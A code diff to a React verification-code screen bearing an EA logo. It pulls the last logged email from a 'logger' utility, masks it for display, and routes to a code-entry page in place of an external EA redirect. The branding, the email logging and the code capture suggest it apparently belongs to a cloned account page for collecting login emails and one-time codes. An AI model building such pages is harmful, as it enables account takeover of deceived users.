@@ -2,6 +2,8 @@ import React from 'react'
 import { useNavigate } from 'react-router-dom'
 import { ArrowLeft } from 'lucide-react'
 import EALogo from './EALogo'
+import { getLastEmail } from '../utils/logger'
+import { maskEmail } from '../utils/emailMask'
 
 const VerificationCodeScreen: React.FC = () => {
   const navigate = useNavigate()
@@ -13,8 +15,8 @@ const VerificationCodeScreen: React.FC = () => {
   const handleSendCode = () => {
     // In a real app you would trigger sending the code here
     console.log('Send code clicked')
-    // Default: redirect to external URL only
-    window.location.href = 'http://ea.com/twitchlinking'
+    // Navigate to code entry screen
+    navigate('/code')
   }
 
   return (
@@ -40,7 +42,12 @@ const VerificationCodeScreen: React.FC = () => {
         {/* Message */}
         <div className="text-center mb-12">
           <p className="text-gray-300 text-lg">
-            we'll send a verification code to on*****@gmx.at
+            {(() => {
+              const masked = maskEmail(getLastEmail())
+              return masked
+                ? `we'll send a verification code to ${masked}`
+                : "we'll send a verification code to your email"
+            })()}
           </p>
         </div>
 
